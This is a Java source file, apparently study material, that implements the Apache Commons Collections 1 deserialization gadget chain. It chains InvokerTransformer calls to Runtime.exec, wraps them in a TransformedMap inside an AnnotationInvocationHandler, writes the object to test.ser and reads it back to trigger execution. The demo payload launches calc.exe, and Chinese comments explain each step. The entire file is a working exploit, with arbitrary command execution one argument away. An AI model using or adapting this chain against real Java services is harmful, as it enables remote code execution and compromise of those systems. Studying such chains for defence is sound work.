package com.tophant.collections1;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.AnnotationType;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class CommonsCollections1LazyMap {
    public static void main(String[] args) {
        String[] execArgs = new String[]{"calc.exe"};
        //Runtime.getRuntime().exec("open /Applications/Calculator.app");
        Class clazz = Runtime.class;
        try {
            Method method = clazz.getMethod("getRuntime",null);
            Runtime runtime = (Runtime) method.invoke(null,null);
            //runtime.exec("open /Applications/Calculator.app");

            // 构造代码执行链
            Transformer[] transoformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",new Class[0]}), //传入的为Runtime的class类,调用clazz.getMethod("getRuntime",null)方法,返回method方法
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},
                            new Object[]{null,new Object[0]}), // 传入的为Method类，调用method.invoke(null,null)方法,返回Runtime类
                    new InvokerTransformer("exec",new Class[]{String.class}, execArgs) // 传入的为Runtime类，调用Runtime.exec(args)方法。调用链执行完毕。

            };
            Transformer transformer = new ChainedTransformer(transoformers);
            //transformer.transform("a");

            Map innerMap = new HashMap();
            innerMap.put("value", "key");
            Map outMap =TransformedMap.decorate(innerMap,null,transformer);
            /*
            for (Iterator iterator=outMap.entrySet().iterator();iterator.hasNext();){
                Map.Entry  entry = (Map.Entry) iterator.next();
                entry.setValue("asdf");

            }
            */
            final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
            Class cls = Class.forName(ANN_INV_HANDLER_CLASS);
            Constructor cons = cls.getDeclaredConstructor(new Class[]{Class.class,Map.class});
            cons.setAccessible(true);
            Object instance = cons.newInstance(new Object[]{Retention.class,outMap});
            FileOutputStream fileOutputStream = new FileOutputStream("test.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(instance);
            objectOutputStream.flush();
            objectOutputStream.close();
            AnnotationType annotationType = AnnotationType.getInstance(Retention.class);
            Map<String,Class<?>> memberTypesTypes = annotationType.memberTypes();
            Class<?>cla = memberTypesTypes.get("value");
            System.out.println(cla.getCanonicalName());


            FileInputStream fileInputStream = new FileInputStream("test.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();


        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
       }


    }
}
